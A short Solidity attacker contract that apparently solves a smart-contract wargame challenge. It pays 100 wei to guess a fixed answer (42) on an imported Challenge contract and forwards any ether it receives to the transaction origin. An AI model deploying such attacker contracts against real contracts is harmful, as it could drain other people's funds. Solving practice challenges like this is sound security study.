pragma solidity 0.8.4;

import "./Challenge.sol";

contract johngishAttacker {
    
    function attack(Challenge instance) public payable {
        require(msg.value == 100 wei);
        instance.guess{value: 100 wei}(42);
    }

    receive() external payable { 
        payable(tx.origin).transfer(address(this).balance);
    }

}